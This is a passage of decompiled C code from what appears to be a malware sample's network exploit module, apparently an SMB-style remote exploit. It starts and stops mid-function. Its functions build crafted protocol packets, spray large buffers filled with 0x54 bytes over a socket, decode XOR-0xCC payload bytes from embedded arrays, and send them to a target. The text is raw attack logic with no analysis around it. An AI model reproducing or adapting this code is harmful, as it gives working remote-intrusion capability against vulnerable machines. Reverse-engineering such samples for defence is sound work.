    return 0;
  *a1 = a2 + 32;
  if ( a3 == 12 )
    *a1 = a2 + 28;
  result = CreateHeap(*a1);
  v6 = result;
  if ( result )
  {
    *(result + 11) = -1;
    *result = a3;
    result[1] = -1;
    *(result + 5) = a4;
    if ( a3 == 12 )
    {
      *(result + 3) = 60;
      *(result + 15) = 4;
      *(result + 17) = -512;
      *(result + 21) = a2;
      *(result + 23) = 59;
      *(result + 25) = a2;
    }
    if ( a3 == 14 )
    {
      *(result + 3) = 64;
      *(result + 15) = 8;
      *(result + 23) = 64;
      *(result + 17) = a2;
      *(result + 21) = a2;
      *(result + 29) = a2 + 1;
    }
    if ( a2 )
      memcpy(&result[*a1 - a2], Src, a2);
    result = v6;
  }
  return result;
}

//----- (681F2EF5) --------------------------------------------------------
signed int __userpurge SockSendRecvDataFreeHeap@<eax>(SOCKET a1@<eax>, __int16 a2, LPVOID a3, int a4, _WORD *a5)
{
  SOCKET v5; // ebx
  signed int result; // eax
  char *v7; // edi
  signed int v8; // edi
  int v9; // [esp+4h] [ebp-4h]

  v9 = 0;
  v5 = a1;
  a5 = ProcessHeaps_1(&v9, a2, a3, a4, a5);
  if ( !a5 )
    return -1;
  v7 = CreateHeap(0x1000u);
  a3 = v7;
  if ( v7 )
  {
    a4 = 0;
    if ( SockSendBuffer(v5, a5, v9) || SockreceivData(&a4, v5, 1, v7) )
      v8 = -1;
    else
      v8 = *(v7 + 9);
    GetAndFreeHeap(&a3);
    GetAndFreeHeap(&a5);
    result = v8;
  }
  else
  {
    GetAndFreeHeap(&a5);
    result = -1;
  }
  return result;
}

//----- (681F2F88) --------------------------------------------------------
signed int __userpurge SockProcessSendRecv_2@<eax>(SOCKET a1@<eax>, __int16 a2, __int16 a3, __int16 a4, _WORD *a5, LPVOID a6, char *a7, int a8, void *a9, _DWORD *a10, _WORD *a11)
{
  SOCKET v11; // ebx
  signed int result; // eax
  char *v13; // edi
  int v14; // edi
  __int16 v15; // bx
  SIZE_T v16; // esi
  void *v17; // eax
  int v18; // [esp+4h] [ebp-4h]

  v18 = 0;
  v11 = a1;
  a7 = sub_681F28B5(a7, a2, a3, a4, a6, a8, a9, &v18);
  if ( !a7 )
    return -1;
  v13 = CreateHeap(0x1000u);
  a6 = v13;
  if ( v13 )
  {
    a9 = 0;
    if ( SockSendBuffer(v11, a7, v18) || SockreceivData(&a9, v11, 1, v13) )
    {
      v14 = -1;
    }
    else
    {
      v15 = a9;
      v16 = a9;
      *a5 = *(v13 + 16);
      a8 = *(v13 + 9);
      v17 = CreateHeap(v16);
      *a10 = v17;
      if ( v17 )
      {
        *a11 = v15;
        memcpy(v17, v13, v16);
      }
      else
      {
        a8 = -1;
      }
      v14 = a8;
    }
    GetAndFreeHeap(&a6);
    GetAndFreeHeap(&a7);
    result = v14;
  }
  else
  {
    GetAndFreeHeap(&a7);
    result = -1;
  }
  return result;
}

//----- (681F3061) --------------------------------------------------------
signed int __userpurge sub_681F3061@<eax>(SOCKET a1@<eax>, __int16 a2, _WORD *a3, LPVOID a4, int a5, char *a6)
{
  SOCKET v6; // ebx
  signed int result; // eax
  char *v8; // edi
  signed int v9; // edi
  __int16 v10; // ax
  int v11; // [esp+4h] [ebp-4h]

  v11 = 0;
  v6 = a1;
  a6 = sub_681F29CE(&v11, a2, a4, a5, a6);
  if ( !a6 )
    return -1;
  v8 = CreateHeap(0x1000u);
  a4 = v8;
  if ( v8 )
  {
    a5 = 0;
    if ( SockSendBuffer(v6, a6, v11) || SockreceivData(&a5, v6, 1, v8) )
    {
      v9 = -1;
    }
    else
    {
      v10 = *(v8 + 14);
      v9 = *(v8 + 9);
      *a3 = v10;
    }
    GetAndFreeHeap(&a4);
    GetAndFreeHeap(&a6);
    result = v9;
  }
  else
  {
    GetAndFreeHeap(&a6);
    result = -1;
  }
  return result;
}

//----- (681F30FE) --------------------------------------------------------
int __stdcall SocketUseSocket1(SOCKET s, int a2, int a3, int a4, int a5, int a6)
{
  char *v6; // ebx
  int *v7; // esi
  char *v8; // eax
  _WORD *v9; // esi
  char *v11; // edi
  signed int v12; // edi
  unsigned __int16 v13; // [esp+Ch] [ebp-8h]
  _WORD *v14; // [esp+10h] [ebp-4h]

  v13 = 0;
  v14 = CreateHeap(3u);
  if ( !v14 )
    goto LABEL_2;
  v13 = 39;
  a6 = Unk_SetIpAddress(39, 113, 49159, a2, a3, a4, a5, a6);
  if ( !a6 )
  {
    v7 = &v14;
LABEL_5:
    GetAndFreeHeap(v7);
LABEL_2:
    v6 = 0;
    goto LABEL_9;
  }
  v8 = CreateHeap(0x27u);
  v6 = v8;
  if ( !v8 )
  {
    GetAndFreeHeap(&v14);
    v7 = &a6;
    goto LABEL_5;
  }
  qmemcpy(v8, a6, 0x24u);
  v9 = v14;
  *(v8 + 18) = *v14;
  v8[38] = *(v9 + 2);
  GetAndFreeHeap(&v14);
  GetAndFreeHeap(&a6);
LABEL_9:
  a6 = v6;
  if ( !v6 )
    return -1;
  v11 = CreateHeap(0x1000u);
  a4 = v11;
  if ( !v11 )
  {
    GetAndFreeHeap(&a6);
    return -1;
  }
  a5 = 0;
  if ( SockSendBuffer(s, v6, v13) || SockreceivData(&a5, s, 1, v11) )
    v12 = -1;
  else
    v12 = *(v11 + 9);
  GetAndFreeHeap(&a4);
  GetAndFreeHeap(&a6);
  return v12;
}

//----- (681F31FB) --------------------------------------------------------
int __stdcall SocketUseSocket2(SOCKET s, int a2, int a3, int a4, int a5, int a6)
{
  _WORD *v6; // eax
  char *v7; // ebx
  int *v8; // esi
  char *v9; // eax
  int v10; // esi
  char *v12; // edi
  signed int v13; // edi
  unsigned __int16 v14; // [esp+0h] [ebp-Ch]
  _DWORD *v15; // [esp+4h] [ebp-8h]
  _DWORD *v16; // [esp+8h] [ebp-4h]

  v14 = 0;
  v6 = CreateHeap(7u);
  if ( v6 )
  {
    *v6 = -254;
    v16 = v6;
  }
  else
  {
    v16 = 0;
  }
  v15 = v16;
  if ( !v16 )
    goto LABEL_5;
  v14 = 43;
  a6 = Unk_SetIpAddress(43, 116, 49159, a2, a3, a4, a5, a6);
  if ( !a6 )
  {
    v8 = &v15;
LABEL_8:
    GetAndFreeHeap(v8);
LABEL_5:
    v7 = 0;
    goto LABEL_12;
  }
  v9 = CreateHeap(0x2Bu);
  v7 = v9;
  if ( !v9 )
  {
    GetAndFreeHeap(&v15);
    v8 = &a6;
    goto LABEL_8;
  }
  qmemcpy(v9, a6, 0x24u);
  v10 = v16;
  *(v9 + 9) = *v16;
  v10 += 4;
  *(v9 + 20) = *v10;
  v9[42] = *(v10 + 2);
  GetAndFreeHeap(&v15);
  GetAndFreeHeap(&a6);
LABEL_12:
  a6 = v7;
  if ( !v7 )
    return -1;
  v12 = CreateHeap(0x1000u);
  a4 = v12;
  if ( !v12 )
  {
    GetAndFreeHeap(&a6);
    return -1;
  }
  a5 = 0;
  if ( SockSendBuffer(s, v7, v14) || SockreceivData(&a5, s, 1, v12) )
    v13 = -1;
  else
    v13 = *(v12 + 9);
  GetAndFreeHeap(&a4);
  GetAndFreeHeap(&a6);
  return v13;
}

//----- (681F330E) --------------------------------------------------------
int __stdcall sub_681F330E(SOCKET s, int a2, int a3, int a4, int a5, int a6, int a7, int a8, void *Src, int a10, int a11, int a12, int a13)
{
  SIZE_T v13; // ebx
  void *v14; // esi
  _WORD *v15; // esi
  BOOL *v16; // esi
  char *v17; // eax
  char *v19; // edi
  size_t v20; // esi
  signed int v21; // ebx
  void *v22; // eax
  int v23; // [esp+Ch] [ebp-4h]
  int v24; // [esp+30h] [ebp+20h]

  LOWORD(v13) = 0;
  v23 = 0;
  Src = sub_681F2CCF(&v23, a7, a8, Src, a10);
  if ( !Src )
    goto LABEL_2;
  v13 = (v23 + 36);
  v15 = Unk_SetIpAddress(v23 + 36, 50, 49159, a2, a3, a4, a5, a6);
  a8 = v15;
  if ( !v15 )
  {
    v16 = &Src;
LABEL_5:
    GetAndFreeHeap(v16);
LABEL_2:
    v14 = 0;
    goto LABEL_9;
  }
  v17 = CreateHeap(v13);
  v24 = v17;
  if ( !v17 )
  {
    GetAndFreeHeap(&Src);
    v16 = &a8;
    goto LABEL_5;
  }
  qmemcpy(v17, v15, 0x24u);
  memcpy(v17 + 36, Src, v23);
  GetAndFreeHeap(&Src);
  GetAndFreeHeap(&a8);
  v14 = v24;
LABEL_9:
  Src = v14;
  if ( !v14 )
    return -1;
  *a11 += a10;
  v19 = CreateHeap(0x1000u);
  a8 = v19;
  if ( !v19 )
  {
LABEL_13:
    GetAndFreeHeap(&Src);
    return -1;
  }
  a10 = 0;
  if ( SockSendBuffer(s, v14, v13) || SockreceivData(&a10, s, 1, v19) )
  {
    GetAndFreeHeap(&a8);
    goto LABEL_13;
  }
  v20 = a10;
  v21 = *(v19 + 9);
  v22 = CreateHeap(a10);
  *a12 = v22;
  if ( v22 )
  {
    *a13 = a10;
    memcpy(v22, v19, v20);
  }
  else
  {
    v21 = -1;
  }
  GetAndFreeHeap(&a8);
  GetAndFreeHeap(&Src);
  return v21;
}

//----- (681F3469) --------------------------------------------------------
int __stdcall sub_681F3469(SOCKET s, int a2, int a3, int a4, int a5, int a6, void *a7, void *Src, int a9)
{
  char *v9; // eax
  void *v10; // esi
  void *v11; // ST18_4
  void *v12; // esi
  _WORD *v13; // esi
  BOOL *v14; // esi
  char *v15; // eax
  char *v17; // edi
  int v18; // edi
  unsigned __int16 v19; // [esp+Ch] [ebp-8h]
  unsigned __int16 v20; // [esp+10h] [ebp-4h]
  int v21; // [esp+2Ch] [ebp+18h]

  v19 = 0;
  v20 = 0;
  if ( Src && (v20 = 4117, v9 = CreateHeap(0x1015u), (v10 = v9) != 0) )
  {
    *(v9 + 3) = 4096;
    *(v9 + 11) = 4096;
    *(v9 + 13) = 53;
    *(v9 + 15) = a7;
    *(v9 + 17) = 0;
    v11 = Src;
    *(v9 + 19) = 4096;
    *v9 = 9;
    memcpy(v9 + 21, v11, 0x1000u);
    a7 = v10;
  }
  else
  {
    a7 = 0;
  }
  Src = a7;
  if ( !a7 )
    goto LABEL_6;
  v19 = v20 + 36;
  v13 = Unk_SetIpAddress(v20 + 36, 51, 49159, a2, a3, a4, a5, a6);
  a6 = v13;
  if ( !v13 )
  {
    v14 = &Src;
LABEL_9:
    GetAndFreeHeap(v14);
LABEL_6:
    v12 = 0;
    goto LABEL_13;
  }
  v15 = CreateHeap((v20 + 36));
  v21 = v15;
  if ( !v15 )
  {
    GetAndFreeHeap(&Src);
    v14 = &a6;
    goto LABEL_9;
  }
  qmemcpy(v15, v13, 0x24u);
  memcpy(v15 + 36, a7, v20);
  GetAndFreeHeap(&Src);
  GetAndFreeHeap(&a6);
  v12 = v21;
LABEL_13:
  a7 = v12;
  if ( !v12 )
    return -1;
  if ( a9 )
  {
    v17 = CreateHeap(0x1000u);
    a9 = v17;
    if ( !v17 )
    {
      GetAndFreeHeap(&a7);
      return -1;
    }
    Src = 0;
    if ( SockSendBuffer(s, v12, v19) || SockreceivData(&Src, s, 1, v17) )
    {
      GetAndFreeHeap(&a9);
      v18 = -1;
    }
    else
    {
      v18 = *(v17 + 9);
      GetAndFreeHeap(&a9);
    }
  }
  else
  {
    v18 = SockSendBuffer(s, v12, v19);
  }
  GetAndFreeHeap(&a7);
  return v18;
}

//----- (681F35FA) --------------------------------------------------------
signed int __userpurge sub_681F35FA@<eax>(SOCKET a1@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, __int16 a11)
{
  SOCKET v11; // ebx
  signed int result; // eax
  char *v13; // edi
  signed int v14; // edi
  int Src; // [esp+4h] [ebp-4h]

  Src = 0;
  v11 = a1;
  a10 = sub_681F2C1E(a11, a2, a3, a4, a5, a6, a7, a8, a9, a10, &Src);
  if ( !a10 )
    return -1;
  v13 = CreateHeap(0x1000u);
  a8 = v13;
  if ( v13 )
  {
    a9 = 0;
    if ( SockSendBuffer(v11, a10, Src) || SockreceivData(&a9, v11, 1, v13) )
      v14 = -1;
    else
      v14 = *(v13 + 9);
    GetAndFreeHeap(&a8);
    GetAndFreeHeap(&a10);
    result = v14;
  }
  else
  {
    GetAndFreeHeap(&a10);
    result = -1;
  }
  return result;
}

//----- (681F369D) --------------------------------------------------------
signed int __userpurge sub_681F369D@<eax>(SOCKET a1@<eax>, __int16 a2, __int16 a3, LPVOID a4, int a5, char *a6)
{
  SOCKET v6; // ebx
  signed int result; // eax
  char *v8; // edi
  signed int v9; // edi
  int v10; // [esp+4h] [ebp-4h]

  v10 = 0;
  v6 = a1;
  a6 = Unk_ReturnByteArrayOfUnk_Exe(a2, a3, a4, a5, a6, &v10);
  if ( !a6 )
    return -1;
  v8 = CreateHeap(0x1000u);
  a4 = v8;
  if ( v8 )
  {
    a5 = 0;
    if ( SockSendBuffer(v6, a6, v10) || SockreceivData(&a5, v6, 1, v8) )
      v9 = -1;
    else
      v9 = *(v8 + 9);
    GetAndFreeHeap(&a4);
    GetAndFreeHeap(&a6);
    result = v9;
  }
  else
  {
    GetAndFreeHeap(&a6);
    result = -1;
  }
  return result;
}

//----- (681F3734) --------------------------------------------------------
int __stdcall SockProcessSendRecv(SOCKET s, int a2, int a3, int a4, int a5, int a6, int a7, void *Src)
{
  SIZE_T v8; // ebx
  void *v9; // esi
  _WORD *v10; // esi
  BOOL *v11; // esi
  char *v12; // eax
  char *v14; // edi
  signed int v15; // edi
  signed __int16 v16; // ax
  int v17; // [esp+Ch] [ebp-4h]

  LOWORD(v8) = 0;
  v17 = 0;
  Src = sub_681F2D82(&v17, Src);
  if ( !Src )
    goto LABEL_2;
  v8 = (v17 + 36);
  v10 = Unk_SetIpAddress(v17 + 36, 162, 49159, a2, a3, a4, a5, a6);
  a6 = v10;
  if ( !v10 )
  {
    v11 = &Src;
LABEL_5:
    GetAndFreeHeap(v11);
LABEL_2:
    v9 = 0;
    goto LABEL_9;
  }
  v12 = CreateHeap(v8);
  a5 = v12;
  if ( !v12 )
  {
    GetAndFreeHeap(&Src);
    v11 = &a6;
    goto LABEL_5;
  }
  qmemcpy(v12, v10, 0x24u);
  memcpy(v12 + 36, Src, v17);
  GetAndFreeHeap(&Src);
  GetAndFreeHeap(&a6);
  v9 = a5;
LABEL_9:
  Src = v9;
  if ( !v9 )
    return -1;
  v14 = CreateHeap(0x1000u);
  a5 = v14;
  if ( !v14 )
  {
    GetAndFreeHeap(&Src);
    return -1;
  }
  a6 = 0;
  if ( SockSendBuffer(s, v9, v8) || SockreceivData(&a6, s, 1, v14) )
  {
    v15 = -1;
  }
  else
  {
    if ( a6 < 0x2Bu )
      v16 = -1;
    else
      v16 = *(v14 + 21);
    v15 = *(v14 + 9);
    *a7 = v16;
  }
  GetAndFreeHeap(&a5);
  GetAndFreeHeap(&Src);
  return v15;
}

//----- (681F3863) --------------------------------------------------------
int __userpurge sub_681F3863@<eax>(unsigned __int16 a1@<ax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, BOOL a8, BOOL a9, void *Src)
{
  char *v10; // ebx
  unsigned __int16 v11; // di
  _WORD *v12; // esi
  BOOL *v13; // esi
  size_t v14; // ST1C_4
  void *v15; // ST18_4
  char *v17; // edi
  signed int v18; // edi
  unsigned __int16 v19; // [esp+Ch] [ebp-8h]
  int v20; // [esp+10h] [ebp-4h]

  v19 = 0;
  v20 = 0;
  Src = sub_681F2E30(&v20, a1, a9, a8, Src);
  if ( !Src )
    goto LABEL_2;
  v11 = v20 + 36;
  v19 = v20 + 36;
  v12 = Unk_SetIpAddress(v20 + 36, 47, 49159, a3, a4, a5, a6, a7);
  a8 = v12;
  if ( !v12 )
  {
    v13 = &Src;
LABEL_5:
    GetAndFreeHeap(v13);
LABEL_2:
    v10 = 0;
    goto LABEL_9;
  }
  v10 = CreateHeap(v11);
  if ( !v10 )
  {
    GetAndFreeHeap(&Src);
    v13 = &a8;
    goto LABEL_5;
  }
  v14 = v20;
  v15 = Src;
  qmemcpy(v10, v12, 0x24u);
  memcpy(v10 + 36, v15, v14);
  GetAndFreeHeap(&Src);
  GetAndFreeHeap(&a8);
LABEL_9:
  Src = v10;
  if ( !v10 )
    return -1;
  v17 = CreateHeap(0x1000u);
  a9 = v17;
  if ( !v17 )
  {
    GetAndFreeHeap(&Src);
    return -1;
  }
  a8 = 0;
  if ( SockSendBuffer(s, v10, v19) || SockreceivData(&a8, s, 1, v17) )
    v18 = -1;
  else
    v18 = *(v17 + 9);
  GetAndFreeHeap(&a9);
  GetAndFreeHeap(&Src);
  return v18;
}

//----- (681F3986) --------------------------------------------------------
int __userpurge sub_681F3986@<eax>(unsigned __int16 a1@<ax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, void *a8, int a9, void *Src, int a11, int a12, int a13)
{
  unsigned __int16 v13; // bx
  unsigned __int16 v14; // di
  char *v15; // esi
  __int16 v16; // ax
  void *v17; // esi
  _WORD *v18; // esi
  BOOL *v19; // esi
  char *v20; // eax
  char *v22; // edi
  signed int v23; // ebx
  size_t v24; // esi
  LPVOID v25; // eax
  void **v26; // ecx
  int v27; // eax
  _WORD *v28; // ecx
  unsigned __int16 v29; // [esp+Ch] [ebp-4h]
  int v30; // [esp+2Ch] [ebp+1Ch]

  v13 = 0;
  v14 = a1;
  v29 = 0;
  if ( !a1 || Src )
  {
    v13 = a1 + 19;
    v15 = CreateHeap((a1 + 19));
    if ( v15 )
    {
      v16 = a8;
      *v15 = 8;
      *(v15 + 11) = v16;
      if ( v16 )
        *(v15 + 13) = 66;
      *(v15 + 15) = a9;
      *(v15 + 17) = v14;
      if ( v14 )
        memcpy(v15 + 19, Src, v14);
      a8 = v15;
    }
    else
    {
      a8 = 0;
    }
  }
  else
  {
    a8 = 0;
  }
  a9 = a8;
  if ( !a8 )
    goto LABEL_12;
  v29 = v13 + 36;
  v18 = Unk_SetIpAddress(v13 + 36, 38, 49159, a3, a4, a5, a6, a7);
  Src = v18;
  if ( !v18 )
  {
    v19 = &a9;
LABEL_15:
    GetAndFreeHeap(v19);
LABEL_12:
    v17 = 0;
    goto LABEL_19;
  }
  v20 = CreateHeap((v13 + 36));
  v30 = v20;
  if ( !v20 )
  {
    GetAndFreeHeap(&a9);
    v19 = &Src;
    goto LABEL_15;
  }
  qmemcpy(v20, v18, 0x24u);
  memcpy(v20 + 36, a8, v13);
  GetAndFreeHeap(&a9);
  GetAndFreeHeap(&Src);
  v17 = v30;
LABEL_19:
  a8 = v17;
  if ( !v17 )
    return -1;
  if ( a13 )
  {
    v22 = CreateHeap(0x1000u);
    a9 = v22;
    if ( !v22 )
    {
      GetAndFreeHeap(&a8);
      return -1;
    }
    a13 = 0;
    if ( SockSendBuffer(s, v17, v29) || SockreceivData(&a13, s, 1, v22) )
    {
      GetAndFreeHeap(&a9);
      v23 = -1;
    }
    else
    {
      v24 = a13;
      v23 = *(v22 + 9);
      v25 = CreateHeap(a13);
      v26 = a11;
      *a11 = v25;
      if ( v25 )
      {
        *a12 = a13;
        memcpy(*v26, v22, v24);
      }
      else
      {
        v23 = -1;
      }
      GetAndFreeHeap(&a9);
    }
  }
  else
  {
    v27 = SockSendBuffer(s, v17, v29);
    v28 = a12;
    v23 = v27;
    *a11 = 0;
    *v28 = 0;
  }
  GetAndFreeHeap(&a8);
  return v23;
}

//----- (681F3B5D) --------------------------------------------------------
int __stdcall sub_681F3B5D(SOCKET s, int a2, int a3, int a4, int a5, int a6)
{
  char *v6; // esi
  char *v8; // ebx
  char *v9; // [esp+4h] [ebp-8h]
  int v10; // [esp+8h] [ebp-4h]

  v6 = CreateHeap(0xF000u);
  v9 = v6;
  if ( !v6 )
    return -1;
  *(v6 + 2055) = 912847747;
  memset(v6 + 2059, 84, 0xE7F4u);
  v10 = 0;
  v8 = 976;
  while ( !sub_681F3469(s, a2, a3, a4, a5, a6, v8, v6, 0) )
  {
    v8 += 4096;
    ++v10;
    v6 += 4096;
    if ( v10 >= 15 )
    {
      GetAndFreeHeap(&v9);
      return sub_681F369D(s, a2, a3, a4, a5, a6);
    }
  }
  GetAndFreeHeap(&v9);
  return -1;
}

//----- (681F3C0A) --------------------------------------------------------
int __stdcall sub_681F3C0A(SOCKET s, int a2, int a3, int a4, int a5, int a6)
{
  char *v6; // eax
  char *v7; // esi
  unsigned int v9; // eax
  int v10; // edi
  char *v11; // [esp+4h] [ebp-4h]

  v6 = CreateHeap(0x1000u);
  v7 = v6;
  v11 = v6;
  if ( !v6 )
    return -1;
  memset(v6, 84, 0xB8Cu);
  v9 = 0;
  do
  {
    v7[v9 + 2956] = byte_68200B08[v9];
    ++v9;
  }
  while ( v9 < 0xAF );
  memset(v7 + 3131, 84, 0x3C5u);
  v10 = sub_681F3469(s, a2, a3, a4, a5, a6, 0xF3D0, v7, 1);
  if ( v10 == -1073741811 )
    v10 = 0;
  GetAndFreeHeap(&v11);
  return v10;
}

//----- (681F3CA0) --------------------------------------------------------
signed int __userpurge sub_681F3CA0@<eax>(char a1@<al>, SOCKET a2)
{
  char v2; // bl
  _WORD *v3; // esi
  unsigned int v5; // eax
  _BYTE *v6; // eax
  signed int v7; // edi
  int v8; // edi
  _WORD *v9; // [esp+8h] [ebp-8h]
  SIZE_T dwBytes; // [esp+Ch] [ebp-4h]

  dwBytes = 0;
  v2 = a1;
  if ( !a1 )
    dwBytes = 132;
  if ( a1 == 1 )
    dwBytes = 2920;
  if ( a1 == 2 )
    dwBytes = 1152;
  v3 = CreateHeap(dwBytes);
  v9 = v3;
  if ( !v3 )
    return -1;
  if ( !v2 )
  {
    v3[1] = -2049;
    v3[2] = CheckIfTimePassed();
    v3[3] = CheckIfTimePassed();
  }
  if ( v2 == 1 )
  {
    *(v3 + 8) = 3;
    *(v3 + 40) = 3;
    *(v3 + 40) = -3145552;
    *(v3 + 41) = -1;
    *(v3 + 42) = -3145552;
    *(v3 + 43) = -1;
    *(v3 + 48) = -2101056;
    *(v3 + 49) = -2101056;
    *(v3 + 99) = -2100848;
    *(v3 + 101) = -2100752;
    *(v3 + 118) = -3145232;
    *(v3 + 119) = -1;
    *(v3 + 122) = -3145216;
    *(v3 + 123) = -1;
    v5 = 0;
    do
    {
      *(v3 + v5 + 497) = byte_682023B0[v5] ^ 0xCC;
      ++v5;
    }
    while ( v5 < 0x977 );
  }
  if ( v2 == 2 )
  {
    v6 = v3;
    v7 = 1147;
    do
    {
      *v6 = v6[byte_68202D27 - v3] ^ 0xCC;
      ++v6;
      --v7;
    }
    while ( v7 );
  }
  v8 = SockSendBuffer(a2, v3, dwBytes);
  GetAndFreeHeap(&v9);
  return v8;
}

//----- (681F3DD7) --------------------------------------------------------
int __stdcall CreateAndGetHeap(SOCKET s, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12)
{
  int result; // eax
  _DWORD *v13; // eax
  const void *v14; // ecx
  int v15; // esi
  int v16; // eax
  int v17; // eax
  int v18; // edi
  char v19[5]; // [esp+0h] [ebp-10h]
  int v20; // [esp+8h] [ebp-8h]
  int v21; // [esp+Ch] [ebp-4h]

  if ( !a9 )
    return -1;
  v20 = a8 + 12;
  v13 = CreateHeap(v20);
  v14 = (a11 + a9);
  v15 = v13;
  *v13 = a10;
  v16 = *a12;
  *(v15 + 4) = a8;
  v21 = v15;
  *(v15 + 8) = v16;
  memcpy((v15 + 12), v14, a8);
  *&v19[1] = 0;
  v17 = 0;
  *v19 = a7;
  do
  {
    *(v17 + v15) ^= v19[v17 % 4];
    ++v17;
  }
  while ( v17 < v20 );
  a10 = 0;
  a9 = 0;
  if ( sub_681F330E(s, a2, a3, a4, a5, a6 + 1, 242, v15, (v15 + 12), a8, a12, &a9, &a10) == -1 )
  {
    GetAndFreeHeap(&a9);
    GetAndFreeHeap(&v21);
    result = -1;
  }
  else
  {
    GetAndFreeHeap(&v21);
    v18 = *(a9 + 26);
    GetAndFreeHeap(&a9);
    result = (v18 == 17) - 1;
  }
  return result;
}

//----- (681F3EC8) --------------------------------------------------------
int __userpurge SocketProcessSocket_1@<eax>(char *a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8)
{
  char *v8; // edi
  int v9; // eax
  char v11; // al
  _DWORD *v12; // esi
  char v13; // dl
  int v14; // ecx
  signed int v15; // ebx
  int v16; // edi
  int v17; // edi
  _DWORD *v18; // [esp+Ch] [ebp-Ch]
  int v19; // [esp+10h] [ebp-8h]
  int v20; // [esp+14h] [ebp-4h]

  v8 = a1;
  *a1 = 0;
  while ( 1 )
  {
    v9 = SockProcessSendRecv(s, a3, a4, a5, a6, a7, a8, *v8);
    if ( v9 == -1 )
      return -1;
    if ( !v9 )
      break;
    if ( ++*v8 >= 2u )
      return -1;
  }
  if ( sub_681F35FA(s, 84, 49159, a3, a4, a5, a6, a7, 3, *v8, *a8) )
    return -1;
  v20 = 0;
  v11 = *v8;
  if ( !*v8 )
    v20 = 72;
  if ( v11 == 1 )
    v20 = 56;
  v19 = (v20 + 1056);
  v12 = CreateHeap(v19);
  v18 = v12;
  if ( !v12 )
    return -1;
  v13 = *v8;
  if ( !*v8 )
  {
    v14 = v19;
    *v12 = 50331653;
    v12[1] = 16;
    v12[2] = v14;
    v12[3] = 1;
    v12[4] = 1104;
    v12[5] = 2949120;
    v12[6] = 3334824;
    v12[7] = 1;
    v12[9] = 1;
    v12[11] = 3270056;
    v12[12] = 69207072;
    v12[13] = 1733312;
    v12[14] = 528;
    v12[16] = 528;
  }
  if ( v13 == 1 )
  {
    *v12 = 50331653;
    v12[1] = 16;
    v12[2] = v19;
    v12[3] = 1;
    v12[4] = 1088;
    v12[5] = 0x80000;
    v12[7] = 100;
    v12[8] = 100;
    v12[9] = 100;
    v12[10] = 3178816;
    v12[11] = 22;
    v12[12] = 1332248;
    v12[13] = 22;
  }
  if ( !v13 )
    v20 += 65532;
  v15 = 0;
  v16 = v12 + v20;
  do
    *(v16 + v15++) = rand() + 1;
  while ( v15 < 1056 );
  v17 = sub_681F3863(v19, s, a3, a4, a5, a6, a7, *a8, 14, v12);
  GetAndFreeHeap(&v18);
  return v17;
}

//----- (681F407B) --------------------------------------------------------
int __userpurge SocketProcessSocket_2@<eax>(_WORD *a1@<edi>, SOCKET s, int a3, int a4, int a5, int a6, int a7)
{
  int v8; // ST14_4
  char *v9; // eax
  char *v10; // eax
  char *v11; // ebx
  int v12; // ebx
  BOOL *v13; // esi
  int v14; // [esp+0h] [ebp-20h]
  unsigned int v15; // [esp+4h] [ebp-1Ch]
  char *i; // [esp+8h] [ebp-18h]
  int v17; // [esp+Ch] [ebp-14h]
  int Src; // [esp+10h] [ebp-10h]
  char v19[4]; // [esp+14h] [ebp-Ch]
  int v20; // [esp+18h] [ebp-8h]
  void *Dst; // [esp+1Ch] [ebp-4h]

  v14 = a4;
  if ( sub_681F3061(s, a3, &v14, a5, a6, *a1) )
    return -1;
  Dst = CreateHeap(0x8Eu);
  if ( !Dst )
    return -1;
  Src = 0;
  *v19 = CreateHeap(0x1000u);
  if ( *v19 )
  {
    v8 = ++*a1;
    v17 = 0;
    v15 = 0;
    v20 = 0x8000;
    v9 = sub_681F2C1E(a7, 32256, 49159, a3, a4, a5, a6, v8, 0, 255, &Src);
    for ( i = v9; v9; i = v9 )
    {
      memcpy(Dst, v9, Src);
      GetAndFreeHeap(&i);
      v10 = sub_681F2C1E(a7, v20 - 512, 49159, a3, v14, a5, a6, *a1, 0, 255, &Src);
      i = v10;
      if ( !v10 )
        break;
      v11 = Dst;
      memcpy(Dst + 71, v10, Src);
      GetAndFreeHeap(&i);
      if ( SockSendBuffer(s, v11, 142) || (v12 = *v19, SockreceivData(&v17, s, 2, v19[0])) )
      {
        GetAndFreeHeap(v19);
        goto LABEL_18;
      }
      if ( *(v12 + 9) )
        break;
      v15 += v20;
      v20 += 4096;
      if ( v20 > 0xC000u )
        v20 = 0x8000;
      if ( v15 >= 0x100000 )
      {
        if ( SocketUseSocket1(s, a3, v14, a5, a6, *a1) )
          break;
        GetAndFreeHeap(&Dst);
        GetAndFreeHeap(v19);
        Sleep(0x456u);
        v17 = 0;
        while ( !sub_681F35FA(s, 65152, 49159, a3, a4, a5, a6, ++*a1, 0, 255, a7) )
        {
          if ( ++v17 > 0x37u )
            return 0;
        }
        return -1;
      }
      v9 = sub_681F2C1E(a7, v20 - 512, 49159, a3, a4, a5, a6, ++*a1, 0, 255, &Src);
    }
    GetAndFreeHeap(&Dst);
    v13 = v19;
  }
  else
  {
LABEL_18:
    v13 = &Dst;
  }
  GetAndFreeHeap(v13);
  return -1;
}

//----- (681F42DF) --------------------------------------------------------
int __stdcall sub_681F42DF(SOCKET s, int a2, int a3, int a4, int a5, int a6, int a7)
{
  _BYTE *v7; // esi
  char *v9; // esi
  int v10; // edx
  unsigned int v11; // ebx
  unsigned int v12; // esi
  __int16 v13; // cx
  bool v14; // al
  int v15; // edi
  unsigned int v16; // esi
  unsigned int v17; // esi
  __int16 v18; // ax
  int v19; // ecx
  int v20; // ebx
  int v21; // ecx
  __int16 v22; // dx
  __int16 v23; // ax
  __int64 v24; // [esp+Ch] [ebp-40h]
  SIZE_T v25; // [esp+14h] [ebp-38h]
  int v26; // [esp+18h] [ebp-34h]
  int v27; // [esp+1Ch] [ebp-30h]
  void *v28; // [esp+20h] [ebp-2Ch]
  int v29; // [esp+24h] [ebp-28h]
  void *v30; // [esp+28h] [ebp-24h]
  int v31; // [esp+2Ch] [ebp-20h]
  int v32; // [esp+30h] [ebp-1Ch]
  int v33; // [esp+34h] [ebp-18h]
  void *Src; // [esp+38h] [ebp-14h]
  char *v35; // [esp+3Ch] [ebp-10h]
  int v36; // [esp+40h] [ebp-Ch]
  unsigned int v37; // [esp+44h] [ebp-8h]
  char v38; // [esp+4Bh] [ebp-1h]

  v7 = CreateHeap(0x10u);
